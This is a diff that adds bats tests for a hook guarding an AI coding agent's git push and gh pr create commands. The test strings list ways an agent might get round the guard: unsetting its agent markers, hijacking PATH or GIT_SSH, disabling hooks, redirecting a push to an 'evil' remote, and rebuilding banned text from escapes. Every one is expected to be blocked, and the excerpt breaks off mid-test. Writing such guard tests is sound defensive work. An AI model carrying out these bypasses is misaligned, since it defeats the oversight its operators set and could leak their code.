@@ -839,3 +839,1097 @@ git push"
     run fire "env AGENT_UNFENCE=remote ssh host whoami"
     [ "$status" -eq 2 ]
 }
+
+# -- the push capability --------------------------------------------------
+# AGENT_UNFENCE=push lifts a fast-forward `git push` to a configured remote by
+# name. the forms that rewrite or delete remote refs, skip pre-push, push in
+# bulk, or name a url or path stay blocked under every capability.
+
+@test "push allows bare git push" {
+    AGENT_UNFENCE=push run fire "git push"
+    [ "$status" -eq 0 ]
+}
+
+@test "push allows git push origin <branch>" {
+    AGENT_UNFENCE=push run fire "git push origin feature/x"
+    [ "$status" -eq 0 ]
+}
+
+@test "push allows git push -u origin <branch>" {
+    AGENT_UNFENCE=push run fire "git push -u origin feature/x"
+    [ "$status" -eq 0 ]
+}
+
+@test "push allows --set-upstream" {
+    AGENT_UNFENCE=push run fire "git push --set-upstream origin feature/x"
+    [ "$status" -eq 0 ]
+}
+
+@test "push allows a HEAD:refs/heads refspec" {
+    AGENT_UNFENCE=push run fire "git push origin HEAD:refs/heads/feature/x"
+    [ "$status" -eq 0 ]
+}
+
+@test "push allows a branch:branch refspec" {
+    AGENT_UNFENCE=push run fire "git push origin feature/x:feature/x"
+    [ "$status" -eq 0 ]
+}
+
+@test "push allows quiet, verbose and dry-run flags" {
+    AGENT_UNFENCE=push run fire "git push -q -v --dry-run origin feature/x"
+    [ "$status" -eq 0 ]
+}
+
+@test "push allows -n (dry-run)" {
+    AGENT_UNFENCE=push run fire "git push -n origin feature/x"
+    [ "$status" -eq 0 ]
+}
+
+@test "push allows --no-follow-tags" {
+    AGENT_UNFENCE=push run fire "git push --no-follow-tags origin feature/x"
+    [ "$status" -eq 0 ]
+}
+
+@test "push allows -o push options" {
+    AGENT_UNFENCE=push run fire "git push -o ci.skip origin feature/x"
+    [ "$status" -eq 0 ]
+}
+
+@test "push allows a push chained after a commit" {
+    AGENT_UNFENCE=push run fire "git commit -m 'feat: x' && git push"
+    [ "$status" -eq 0 ]
+}
+
+@test "push allows git push behind a stripped -C" {
+    AGENT_UNFENCE=push run fire "git -C /tmp/ai/repo push origin feature/x"
+    [ "$status" -eq 0 ]
+}
+
+@test "push allows git push behind -c of an unrelated key" {
+    AGENT_UNFENCE=push run fire "git -c user.name=U push origin feature/x"
+    [ "$status" -eq 0 ]
+}
+
+@test "push allows a folded double-space git push" {
+    AGENT_UNFENCE=push run fire "git  push origin feature/x"
+    [ "$status" -eq 0 ]
+}
+
+@test "push allows a line-continued git push" {
+    AGENT_UNFENCE=push run fire "git push \\
+origin feature/x"
+    [ "$status" -eq 0 ]
+}
+
+# force -- every spelling
+
+@test "push does not lift --force" {
+    AGENT_UNFENCE=push run fire "git push --force origin feature/x"
+    [ "$status" -eq 2 ]
+}
+
+@test "push does not lift --force after the refspec" {
+    AGENT_UNFENCE=push run fire "git push origin feature/x --force"
+    [ "$status" -eq 2 ]
+}
+
+@test "push does not lift -f" {
+    AGENT_UNFENCE=push run fire "git push -f origin feature/x"
+    [ "$status" -eq 2 ]
+}
+
+@test "push does not lift -f combined with -u (either order)" {
+    AGENT_UNFENCE=push run fire "git push -fu origin feature/x"
+    [ "$status" -eq 2 ]
+    AGENT_UNFENCE=push run fire "git push -uf origin feature/x"
+    [ "$status" -eq 2 ]
+}
+
+@test "push does not lift --force-with-lease" {
+    AGENT_UNFENCE=push run fire "git push --force-with-lease origin feature/x"
+    [ "$status" -eq 2 ]
+}
+
+@test "push does not lift --force-with-lease=<ref>:<sha>" {
+    AGENT_UNFENCE=push run fire "git push --force-with-lease=feature/x:abc123 origin feature/x"
+    [ "$status" -eq 2 ]
+}
+
+@test "push does not lift --force-if-includes" {
+    AGENT_UNFENCE=push run fire "git push --force-with-lease --force-if-includes origin feature/x"
+    [ "$status" -eq 2 ]
+}
+
+@test "push does not lift a +refspec" {
+    AGENT_UNFENCE=push run fire "git push origin +feature/x"
+    [ "$status" -eq 2 ]
+}
+
+@test "push does not lift a +HEAD:branch refspec" {
+    AGENT_UNFENCE=push run fire "git push origin +HEAD:main"
+    [ "$status" -eq 2 ]
+}
+
+@test "push does not lift a line-continued --force" {
+    AGENT_UNFENCE=push run fire "git push origin feature/x \\
+--force"
+    [ "$status" -eq 2 ]
+}
+
+# delete
+
+@test "push does not lift --delete" {
+    AGENT_UNFENCE=push run fire "git push --delete origin feature/x"
+    [ "$status" -eq 2 ]
+}
+
+@test "push does not lift -d" {
+    AGENT_UNFENCE=push run fire "git push -d origin feature/x"
+    [ "$status" -eq 2 ]
+}
+
+@test "push does not lift a :branch delete refspec" {
+    AGENT_UNFENCE=push run fire "git push origin :feature/x"
+    [ "$status" -eq 2 ]
+}
+
+@test "push does not lift a bare : (push all matching)" {
+    AGENT_UNFENCE=push run fire "git push origin :"
+    [ "$status" -eq 2 ]
+}
+
+# bulk
+
+@test "push does not lift --mirror" {
+    AGENT_UNFENCE=push run fire "git push --mirror origin"
+    [ "$status" -eq 2 ]
+}
+
+@test "push does not lift --prune" {
+    AGENT_UNFENCE=push run fire "git push --prune origin"
+    [ "$status" -eq 2 ]
+}
+
+@test "push does not lift --all" {
+    AGENT_UNFENCE=push run fire "git push --all origin"
+    [ "$status" -eq 2 ]
+}
+
+@test "push does not lift --branches" {
+    AGENT_UNFENCE=push run fire "git push --branches origin"
+    [ "$status" -eq 2 ]
+}
+
+@test "push does not lift --tags" {
+    AGENT_UNFENCE=push run fire "git push --tags origin"
+    [ "$status" -eq 2 ]
+}
+
+# git accepts any unambiguous prefix of a long option
+
+@test "push does not lift abbreviated long options" {
+    local abbrev
+    for abbrev in --force-w --force-with --force-i --de --del --dele --m --mi --mirr --pru --prun --al --b --br --branch --ta --tag --no-veri --no-verif --rece --receive --e --ex --exe --rep; do
+        AGENT_UNFENCE=push run fire "git push $abbrev origin feature/x"
+        [ "$status" -eq 2 ] || { echo "not blocked: $abbrev"; return 1; }
+    done
+}
+
+@test "push does not lift the ambiguous --for / --forc spellings either" {
+    AGENT_UNFENCE=push run fire "git push --for origin feature/x"
+    [ "$status" -eq 2 ]
+    AGENT_UNFENCE=push run fire "git push --forc origin feature/x"
+    [ "$status" -eq 2 ]
+}
+
+@test "push keeps the harmless long options that share a prefix" {
+    local flag
+    for flag in --follow-tags --no-follow-tags --dry-run --porcelain --progress --atomic --thin --no-thin --set-upstream --push-option=x --signed --recurse-submodules=check --verbose --quiet --ipv4 --no-verbose --no-force-with-lease; do
+        AGENT_UNFENCE=push run fire "git push $flag origin feature/x"
+        [ "$status" -eq 0 ] || { echo "wrongly blocked: $flag"; return 1; }
+    done
+}
+
+# redirects are files, not remotes
+
+@test "push allows output redirected to a log file" {
+    AGENT_UNFENCE=push run fire "git push origin feature/x > /tmp/ai/log/push.log 2>&1"
+    [ "$status" -eq 0 ]
+    AGENT_UNFENCE=push run fire "git push origin feature/x >/tmp/ai/log/push.log 2>/dev/null"
+    [ "$status" -eq 0 ]
+    AGENT_UNFENCE=push run fire "git push origin feature/x 2>&1 | tee /tmp/ai/log/push.log"
+    [ "$status" -eq 0 ]
+}
+
+@test "push does not lift a substituted target or refspec" {
+    AGENT_UNFENCE=push run fire "git push origin \$(cat /tmp/ai/target)"
+    [ "$status" -eq 2 ]
+    AGENT_UNFENCE=push run fire "git push \$REMOTE feature/x"
+    [ "$status" -eq 2 ]
+    AGENT_UNFENCE=push run fire "git push \${REMOTE} feature/x"
+    [ "$status" -eq 2 ]
+    AGENT_UNFENCE=push run fire "git push origin \`cat /tmp/ai/target\`"
+    [ "$status" -eq 2 ]
+    AGENT_UNFENCE=push run fire "git push origin \$'feature/x'"
+    [ "$status" -eq 2 ]
+    AGENT_UNFENCE=push run fire "git push -u origin \"\$(git branch --show-current)\""
+    [ "$status" -eq 2 ]
+}
+
+@test "push allows HEAD in place of a substituted branch name" {
+    AGENT_UNFENCE=push run fire "git push -u origin HEAD"
+    [ "$status" -eq 0 ]
+}
+
+@test "push still blocks a url target next to a redirect" {
+    AGENT_UNFENCE=push run fire "git push /tmp/ai/bare.git feature/x > /tmp/ai/log/push.log"
+    [ "$status" -eq 2 ]
+}
+
+# plumbing that skips pre-push
+
+@test "push does not lift git send-pack" {
+    AGENT_UNFENCE=push run fire "git send-pack origin feature/x"
+    [ "$status" -eq 2 ]
+    run fire "git send-pack --force origin feature/x"
+    [ "$status" -eq 2 ]
+}
+
+@test "push does not lift git http-push" {
+    AGENT_UNFENCE=push run fire "git http-push https://host/o/r.git feature/x"
+    [ "$status" -eq 2 ]
+}
+
+@test "push does not lift the remote transport helpers" {
+    AGENT_UNFENCE=push run fire "git remote-https origin"
+    [ "$status" -eq 2 ]
+    AGENT_UNFENCE=push run fire "git-remote-https origin https://host/o/r.git"
+    [ "$status" -eq 2 ]
+    AGENT_UNFENCE=push run fire "git remote-ssh origin"
+    [ "$status" -eq 2 ]
+}
+
+@test "git remote reads are not mistaken for a transport helper" {
+    run fire "git remote -v"
+    [ "$status" -eq 0 ]
+    run fire "git remote show origin"
+    [ "$status" -eq 0 ]
+}
+
+# the hooks read the agent markers from the environment
+
+@test "push does not lift a push with the agent markers unset" {
+    AGENT_UNFENCE=push run fire "env -u CLAUDECODE git push origin feature/x"
+    [ "$status" -eq 2 ]
+    AGENT_UNFENCE=push run fire "env --unset=AGENT_SESSION -u OPENCODE_PID git push origin feature/x"
+    [ "$status" -eq 2 ]
+    AGENT_UNFENCE=push run fire "unset CLAUDECODE AGENT_SESSION; git push origin feature/x"
+    [ "$status" -eq 2 ]
+}
+
+@test "push does not lift a push with the agent markers rewritten" {
+    AGENT_UNFENCE=push run fire "CLAUDECODE=0 git push origin feature/x"
+    [ "$status" -eq 2 ]
+    AGENT_UNFENCE=push run fire "env AGENT_SESSION= git push origin feature/x"
+    [ "$status" -eq 2 ]
+    AGENT_UNFENCE=push run fire "export CLAUDECODE=; git push origin feature/x"
+    [ "$status" -eq 2 ]
+}
+
+@test "push does not lift a push under an emptied environment" {
+    AGENT_UNFENCE=push run fire "env -i PATH=/usr/bin git push origin feature/x"
+    [ "$status" -eq 2 ]
+    AGENT_UNFENCE=push run fire "env --ignore-environment git push origin feature/x"
+    [ "$status" -eq 2 ]
+}
+
+# one-shot aliases and the environment reach the same layers
+
+@test "a -c alias one-shot is blocked, capability or not" {
+    run fire "git -c alias.p=push p origin feature/x"
+    [ "$status" -eq 2 ]
+    AGENT_UNFENCE=push run fire "git -c alias.p=push p origin feature/x"
+    [ "$status" -eq 2 ]
+    AGENT_UNFENCE=push run fire "git -c alias.pf='push --force' pf origin feature/x"
+    [ "$status" -eq 2 ]
+    AGENT_UNFENCE=history run fire "git -c alias.x='reset --hard' x"
+    [ "$status" -eq 2 ]
+    run fire "git --config-env=alias.p=P p"
+    [ "$status" -eq 2 ]
+}
+
+@test "push does not lift --exec-path=<dir>" {
+    AGENT_UNFENCE=push run fire "git --exec-path=/tmp/ai/evil push origin feature/x"
+    [ "$status" -eq 2 ]
+}
+
+@test "git --exec-path as a read stays allowed" {
+    run fire "git --exec-path"
+    [ "$status" -eq 0 ]
+}
+
+@test "push does not lift git config env overrides" {
+    local v
+    for v in GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null GIT_CONFIG_NOSYSTEM=1 "GIT_CONFIG_PARAMETERS='alias.p=push'" GIT_CONFIG_COUNT=1 GIT_DIR=/tmp/ai/x/.git GIT_WORK_TREE=/tmp/ai/x GIT_EXEC_PATH=/tmp/ai/evil "GIT_SSH_COMMAND='ssh -i /tmp/ai/k'" GIT_SSH=/tmp/ai/evil GIT_PROXY_COMMAND=/tmp/ai/evil GIT_NAMESPACE=x HOME=/tmp/ai/home XDG_CONFIG_HOME=/tmp/ai/cfg; do
+        AGENT_UNFENCE=push run fire "$v git push origin feature/x"
+        [ "$status" -eq 2 ] || { echo "not blocked: $v"; return 1; }
+        AGENT_UNFENCE=push run fire "env $v git push origin feature/x"
+        [ "$status" -eq 2 ] || { echo "not blocked: env $v"; return 1; }
+        AGENT_UNFENCE=push run fire "export $v; git push origin feature/x"
+        [ "$status" -eq 2 ] || { echo "not blocked: export $v"; return 1; }
+    done
+}
+
+@test "git env overrides are blocked without any push too" {
+    run fire "GIT_CONFIG_GLOBAL=/dev/null git commit -m 'feat: x'"
+    [ "$status" -eq 2 ]
+    run fire "HOME=/tmp/ai/home git status"
+    [ "$status" -eq 2 ]
+}
+
+@test "harmless git env stays allowed" {
+    AGENT_UNFENCE=push run fire "GIT_TRACE=1 GIT_CURL_VERBOSE=1 git push origin feature/x"
+    [ "$status" -eq 0 ]
+    run fire "GIT_AUTHOR_NAME=t GIT_PAGER=cat git log -1"
+    [ "$status" -eq 0 ]
+    run fire "GIT_EDITOR=true git commit -m 'feat: x'"
+    [ "$status" -eq 0 ]
+}
+
+@test "PATH is not rewritten around git or gh" {
+    AGENT_UNFENCE=push run fire "PATH=/tmp/ai/evil:\$PATH git push origin feature/x"
+    [ "$status" -eq 2 ]
+    AGENT_UNFENCE=pr run fire "env PATH=/tmp/ai/evil gh pr create --fill"
+    [ "$status" -eq 2 ]
+    run fire "export PATH=/tmp/ai/evil:\$PATH; git status"
+    [ "$status" -eq 2 ]
+    run fire "PATH=/tmp/ai/evil:\$PATH /usr/bin/git status"
+    [ "$status" -eq 2 ]
+}
+
+@test "PATH may be rewritten around anything else" {
+    run fire "PATH=/opt/homebrew/bin:\$PATH make test"
+    [ "$status" -eq 0 ]
+    run fire "env PATH=/tmp/ai/bin:\$PATH cargo build"
+    [ "$status" -eq 0 ]
+}
+
+@test "marker tampering is blocked without any push in the command" {
+    run fire "unset CLAUDECODE"
+    [ "$status" -eq 2 ]
+    run fire "env -u AGENT_SESSION make release"
+    [ "$status" -eq 2 ]
+}
+
+@test "an env prefix that leaves the markers alone stays allowed" {
+    AGENT_UNFENCE=push run fire "env GIT_TRACE=1 git push origin feature/x"
+    [ "$status" -eq 0 ]
+    run fire "env -u FOO make test"
+    [ "$status" -eq 0 ]
+}
+
+# hook and remote-side bypasses
+
+@test "push does not lift --no-verify" {
+    AGENT_UNFENCE=push run fire "git push --no-verify origin feature/x"
+    [ "$status" -eq 2 ]
+}
+
+@test "push does not lift -c core.hooksPath" {
+    AGENT_UNFENCE=push run fire "git -c core.hooksPath=/dev/null push origin feature/x"
+    [ "$status" -eq 2 ]
+}
+
+@test "push does not lift --receive-pack" {
+    AGENT_UNFENCE=push run fire "git push --receive-pack=/tmp/ai/evil origin feature/x"
+    [ "$status" -eq 2 ]
+}
+
+@test "push does not lift --exec" {
+    AGENT_UNFENCE=push run fire "git push --exec=/tmp/ai/evil origin feature/x"
+    [ "$status" -eq 2 ]
+}
+
+@test "push does not lift --repo" {
+    AGENT_UNFENCE=push run fire "git push --repo=https://github.com/o/r.git feature/x"
+    [ "$status" -eq 2 ]
+    AGENT_UNFENCE=push run fire "git push --repo origin feature/x"
+    [ "$status" -eq 2 ]
+}
+
+# targets that are not a configured remote name
+
+@test "push does not lift an https url target" {
+    AGENT_UNFENCE=push run fire "git push https://github.com/o/r.git feature/x"
+    [ "$status" -eq 2 ]
+}
+
+@test "push does not lift an scp-style url target" {
+    AGENT_UNFENCE=push run fire "git push git@github.com:o/r.git feature/x"
+    [ "$status" -eq 2 ]
+}
+
+@test "push does not lift an ssh:// url target" {
+    AGENT_UNFENCE=push run fire "git push ssh://git@host/o/r feature/x"
+    [ "$status" -eq 2 ]
+}
+
+@test "push does not lift a file:// url target" {
+    AGENT_UNFENCE=push run fire "git push file:///tmp/ai/bare.git feature/x"
+    [ "$status" -eq 2 ]
+}
+
+@test "push does not lift an absolute path target" {
+    AGENT_UNFENCE=push run fire "git push /tmp/ai/bare.git feature/x"
+    [ "$status" -eq 2 ]
+}
+
+@test "push does not lift a relative path target" {
+    AGENT_UNFENCE=push run fire "git push ./bare feature/x"
+    [ "$status" -eq 2 ]
+    AGENT_UNFENCE=push run fire "git push ../bare feature/x"
+    [ "$status" -eq 2 ]
+}
+
+@test "push does not lift a tilde path target" {
+    AGENT_UNFENCE=push run fire "git push ~/bare feature/x"
+    [ "$status" -eq 2 ]
+}
+
+@test "push does not lift a bare-repo-looking .git target" {
+    AGENT_UNFENCE=push run fire "git push evil.git feature/x"
+    [ "$status" -eq 2 ]
+}
+
+# one-shot config that redirects or widens the push
+
+@test "push does not lift -c remote.<r>.pushurl" {
+    AGENT_UNFENCE=push run fire "git -c remote.origin.pushurl=git@evil:o/r.git push origin feature/x"
+    [ "$status" -eq 2 ]
+}
+
+@test "push does not lift a glued -cremote.<r>.url" {
+    AGENT_UNFENCE=push run fire "git -cremote.origin.url=git@evil:o/r.git push origin feature/x"
+    [ "$status" -eq 2 ]
+}
+
+@test "push does not lift -c url.<base>.pushInsteadOf" {
+    AGENT_UNFENCE=push run fire "git -c url.git@evil:.pushInsteadOf=git@github.com: push origin feature/x"
+    [ "$status" -eq 2 ]
+}
+
+@test "push does not lift -c push.default=matching" {
+    AGENT_UNFENCE=push run fire "git -c push.default=matching push"
+    [ "$status" -eq 2 ]
+}
+
+@test "push does not lift -c branch.<b>.pushRemote" {
+    AGENT_UNFENCE=push run fire "git -c branch.main.pushRemote=evil push"
+    [ "$status" -eq 2 ]
+}
+
+@test "push does not lift -c remote.pushDefault" {
+    AGENT_UNFENCE=push run fire "git -c remote.pushDefault=evil push"
+    [ "$status" -eq 2 ]
+}
+
+@test "push does not lift --config-env=remote.<r>.pushurl" {
+    AGENT_UNFENCE=push run fire "git --config-env=remote.origin.pushurl=EVIL push origin feature/x"
+    [ "$status" -eq 2 ]
+}
+
+@test "a -c push.* one-shot on a non-push subcommand stays allowed" {
+    run fire "git -c push.default=simple status"
+    [ "$status" -eq 0 ]
+}
+
+# chains
+
+@test "push does not lift a force push chained after a clean one" {
+    AGENT_UNFENCE=push run fire "git push origin feature/x && git push --force origin feature/x"
+    [ "$status" -eq 2 ]
+}
+
+@test "push does not lift a delete chained after a clean push" {
+    AGENT_UNFENCE=push run fire "git push origin feature/x; git push origin :feature/x"
+    [ "$status" -eq 2 ]
+}
+
+@test "push does not lift a url push on the second line of a script" {
+    AGENT_UNFENCE=push run fire "git push origin feature/x
+git push git@evil:o/r.git feature/x"
+    [ "$status" -eq 2 ]
+}
+
+# push lifts push only
+
+@test "push does not lift git tag" {
+    AGENT_UNFENCE=push run fire "git tag v1.0"
+    [ "$status" -eq 2 ]
+}
+
+@test "push does not lift the branch category" {
+    AGENT_UNFENCE=push run fire "git switch main"
+    [ "$status" -eq 2 ]
+}
+
+@test "push does not lift the history category" {
+    AGENT_UNFENCE=push run fire "git rebase main"
+    [ "$status" -eq 2 ]
+}
+
+@test "push does not lift git remote add" {
+    AGENT_UNFENCE=push run fire "git remote add evil git@evil:o/r.git"
+    [ "$status" -eq 2 ]
+}
+
+@test "push does not lift git config of a push key" {
+    AGENT_UNFENCE=push run fire "git config push.default matching"
+    [ "$status" -eq 2 ]
+}
+
+@test "push does not lift gh pr create" {
+    AGENT_UNFENCE=push run fire "gh pr create --fill"
+    [ "$status" -eq 2 ]
+}
+
+@test "push composes with other capabilities" {
+    AGENT_UNFENCE=branch,push run fire "git push -u origin feature/x"
+    [ "$status" -eq 0 ]
+}
+
+@test "an unrelated capability does not lift the push fence" {
+    AGENT_UNFENCE=pr run fire "git push origin feature/x"
+    [ "$status" -eq 2 ]
+    AGENT_UNFENCE=meta run fire "git push origin feature/x"
+    [ "$status" -eq 2 ]
+}
+
+@test "an empty AGENT_UNFENCE does not lift the push fence" {
+    AGENT_UNFENCE= run fire "git push origin feature/x"
+    [ "$status" -eq 2 ]
+}
+
+@test "a substring of a capability name does not lift the push fence" {
+    AGENT_UNFENCE=pushy run fire "git push origin feature/x"
+    [ "$status" -eq 2 ]
+    AGENT_UNFENCE=nopush run fire "git push origin feature/x"
+    [ "$status" -eq 2 ]
+}
+
+@test "the push capability cannot be granted from inside the command text" {
+    run fire "env AGENT_UNFENCE=push git push origin feature/x"
+    [ "$status" -eq 2 ]
+    run fire "AGENT_UNFENCE=push git push origin feature/x"
+    [ "$status" -eq 2 ]
+}
+
+@test "the push fence names the capability in its reason" {
+    run fire "git push origin feature/x"
+    [ "$status" -eq 2 ]
+    [[ "$output" == *"AGENT_UNFENCE=push"* ]]
+}
+
+@test "the hard push fence does not name a capability" {
+    AGENT_UNFENCE=push run fire "git push --force origin feature/x"
+    [ "$status" -eq 2 ]
+    [[ "$output" != *"AGENT_UNFENCE=push"* ]]
+    [[ "$output" == *"every capability"* ]]
+}
+
+# -- the pr capability ----------------------------------------------------
+# AGENT_UNFENCE=pr lifts `gh pr create` against the current repo. the title,
+# when given inline, carries a conventional commits prefix; the body -- inline
+# or a file -- is ascii with no agent attribution. every other gh write, and
+# git push, stay where they were.
+
+@test "pr allows gh pr create with a conventional title" {
+    AGENT_UNFENCE=pr run fire "gh pr create --title 'feat: thing' --body 'does x'"
+    [ "$status" -eq 0 ]
+}
+
+@test "pr allows the -t / -b short flags" {
+    AGENT_UNFENCE=pr run fire "gh pr create -t 'fix(hooks): thing' -b 'body'"
+    [ "$status" -eq 0 ]
+}
+
+@test "pr allows the --title= form" {
+    AGENT_UNFENCE=pr run fire "gh pr create --title='docs: thing' --body='b'"
+    [ "$status" -eq 0 ]
+}
+
+@test "pr allows double-quoted and unquoted titles" {
+    AGENT_UNFENCE=pr run fire "gh pr create -t \"chore: thing\" -b b"
+    [ "$status" -eq 0 ]
+    AGENT_UNFENCE=pr run fire "gh pr create -t refactor: -b b"
+    [ "$status" -eq 0 ]
+}
+
+@test "pr allows the ! and ? suffix markers" {
+    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat!: break' -b b"
+    [ "$status" -eq 0 ]
+    AGENT_UNFENCE=pr run fire "gh pr create -t 'fix?: unverified' -b b"
+    [ "$status" -eq 0 ]
+}
+
+@test "pr allows --fill and its variants" {
+    AGENT_UNFENCE=pr run fire "gh pr create --fill"
+    [ "$status" -eq 0 ]
+    AGENT_UNFENCE=pr run fire "gh pr create -f"
+    [ "$status" -eq 0 ]
+    AGENT_UNFENCE=pr run fire "gh pr create --fill-first --draft"
+    [ "$status" -eq 0 ]
+}
+
+@test "pr allows --web" {
+    AGENT_UNFENCE=pr run fire "gh pr create --web"
+    [ "$status" -eq 0 ]
+}
+
+@test "pr allows --base / --head / reviewers / labels" {
+    AGENT_UNFENCE=pr run fire "gh pr create --fill --base main --head feature/x -r someone -l bug -a @me"
+    [ "$status" -eq 0 ]
+}
+
+@test "pr allows a heredoc body" {
+    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' --body \"\$(cat <<'EOF'
+this PR adds x.
+
+- one
+- two
+EOF
+)\""
+    [ "$status" -eq 0 ]
+}
+
+@test "pr allows a readable absolute body file" {
+    printf 'this PR adds x.\n' > "$BATS_TEST_TMPDIR/body.md"
+    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' --body-file $BATS_TEST_TMPDIR/body.md"
+    [ "$status" -eq 0 ]
+    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' -F $BATS_TEST_TMPDIR/body.md"
+    [ "$status" -eq 0 ]
+    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' --body-file=$BATS_TEST_TMPDIR/body.md"
+    [ "$status" -eq 0 ]
+}
+
+@test "pr allows a quoted absolute body file" {
+    printf 'this PR adds x.\n' > "$BATS_TEST_TMPDIR/body.md"
+    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' --body-file \"$BATS_TEST_TMPDIR/body.md\""
+    [ "$status" -eq 0 ]
+}
+
+@test "pr allows gh pr create after a read on the same line" {
+    AGENT_UNFENCE=pr run fire "gh pr view 1 || gh pr create --fill"
+    [ "$status" -eq 0 ]
+}
+
+@test "pr allows a folded double-space gh pr create" {
+    AGENT_UNFENCE=pr run fire "gh  pr  create --fill"
+    [ "$status" -eq 0 ]
+}
+
+# not without the capability
+
+@test "gh pr create stays blocked without the capability" {
+    run fire "gh pr create --fill"
+    [ "$status" -eq 2 ]
+    [[ "$output" == *"AGENT_UNFENCE=pr"* ]]
+}
+
+# current repo only
+
+@test "pr does not lift -R" {
+    AGENT_UNFENCE=pr run fire "gh pr create --fill -R o/r"
+    [ "$status" -eq 2 ]
+}
+
+@test "pr does not lift --repo" {
+    AGENT_UNFENCE=pr run fire "gh pr create --fill --repo o/r"
+    [ "$status" -eq 2 ]
+    AGENT_UNFENCE=pr run fire "gh pr create --fill --repo=o/r"
+    [ "$status" -eq 2 ]
+}
+
+# title
+
+@test "pr blocks a title without a conventional prefix" {
+    AGENT_UNFENCE=pr run fire "gh pr create -t 'Add thing' -b b"
+    [ "$status" -eq 2 ]
+}
+
+@test "pr blocks a capitalised prefix" {
+    AGENT_UNFENCE=pr run fire "gh pr create -t 'Feat: thing' -b b"
+    [ "$status" -eq 2 ]
+}
+
+@test "pr blocks a prefix without the space after the colon" {
+    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat:thing' -b b"
+    [ "$status" -eq 2 ]
+}
+
+@test "pr blocks a prefix that is only a prefix of a type" {
+    AGENT_UNFENCE=pr run fire "gh pr create -t 'feature: thing' -b b"
+    [ "$status" -eq 2 ]
+}
+
+@test "pr blocks a title built by command substitution" {
+    AGENT_UNFENCE=pr run fire "gh pr create -t \"\$(head -1 /tmp/ai/msg)\" -b b"
+    [ "$status" -eq 2 ]
+}
+
+@test "pr blocks a title on a second gh pr create in the chain" {
+    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: ok' -b b && gh pr create -t 'Bad' -b b"
+    [ "$status" -eq 2 ]
+}
+
+# gh short flags glue their value and stack behind the booleans
+
+@test "pr checks a glued -t value" {
+    AGENT_UNFENCE=pr run fire "gh pr create -t'Add thing' -b b"
+    [ "$status" -eq 2 ]
+    AGENT_UNFENCE=pr run fire "gh pr create -tAdd -b b"
+    [ "$status" -eq 2 ]
+    AGENT_UNFENCE=pr run fire "gh pr create -t'feat: thing' -b b"
+    [ "$status" -eq 0 ]
+    AGENT_UNFENCE=pr run fire "gh pr create -t=feat: -b b"
+    [ "$status" -eq 0 ]
+}
+
+@test "pr checks -t stacked behind boolean short flags" {
+    AGENT_UNFENCE=pr run fire "gh pr create -dt 'Add thing' -b b"
+    [ "$status" -eq 2 ]
+    AGENT_UNFENCE=pr run fire "gh pr create -dwt'Add thing' -b b"
+    [ "$status" -eq 2 ]
+    AGENT_UNFENCE=pr run fire "gh pr create -dt 'feat: thing' -b b"
+    [ "$status" -eq 0 ]
+}
+
+@test "pr blocks -R glued or stacked" {
+    AGENT_UNFENCE=pr run fire "gh pr create --fill -Ro/r"
+    [ "$status" -eq 2 ]
+    AGENT_UNFENCE=pr run fire "gh pr create -fR o/r"
+    [ "$status" -eq 2 ]
+    AGENT_UNFENCE=pr run fire "gh pr create -dfR o/r"
+    [ "$status" -eq 2 ]
+}
+
+@test "pr checks a glued or stacked -F body file" {
+    printf 'does x\n\nCo-Authored-By: Claude <noreply@anthropic.com>\n' > "$BATS_TEST_TMPDIR/body.md"
+    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' -F$BATS_TEST_TMPDIR/body.md"
+    [ "$status" -eq 2 ]
+    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' -dF $BATS_TEST_TMPDIR/body.md"
+    [ "$status" -eq 2 ]
+    printf 'does x\n' > "$BATS_TEST_TMPDIR/clean.md"
+    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' -F$BATS_TEST_TMPDIR/clean.md"
+    [ "$status" -eq 0 ]
+}
+
+@test "pr does not mistake -r / -l / -T for -R / -t / -F" {
+    AGENT_UNFENCE=pr run fire "gh pr create --fill -r someone -l wontfix -T pull_request_template.md"
+    [ "$status" -eq 0 ]
+}
+
+# text must be literal
+
+@test "pr blocks a body read from a file by substitution" {
+    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' -b \"\$(cat /tmp/ai/body.md)\""
+    [ "$status" -eq 2 ]
+    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' -b \"\`cat /tmp/ai/body.md\`\""
+    [ "$status" -eq 2 ]
+}
+
+@test "pr blocks a body from a variable" {
+    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' -b \"\$BODY\""
+    [ "$status" -eq 2 ]
+    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' -b \"\${BODY}\""
+    [ "$status" -eq 2 ]
+}
+
+@test "pr blocks ansi-c quoting, which rebuilds banned text from escapes" {
+    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' -b \$'Co-Auth\\x6fred-By: x'"
+    [ "$status" -eq 2 ]
+}
+
+@test "pr blocks a substitution hidden behind a pipe in the body" {
+    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' -b 'a | \$(cat /tmp/ai/body.md)'"
+    [ "$status" -eq 2 ]
+}
+
+@test "pr blocks a substitution elsewhere on the line" {
+    AGENT_UNFENCE=pr run fire "cd \$(git rev-parse --show-toplevel) && gh pr create --fill"
+    [ "$status" -eq 2 ]
+}
+
+@test "pr allows the inline heredoc forms" {
+    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' -b \"\$(cat <<EOF
+body
+EOF
+)\""
+    [ "$status" -eq 0 ]
+    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' -b \"\$(cat <<\"EOF\"
+body
+EOF
+)\""
+    [ "$status" -eq 0 ]
+    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' -b \"\$(cat <<-'EOF'
+	body
+	EOF
+)\""
+    [ "$status" -eq 0 ]
+}
+
+@test "pr blocks a heredoc whose body carries a substitution" {
+    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' -b \"\$(cat <<EOF
+\$(cat /tmp/ai/body.md)
+EOF
+)\""
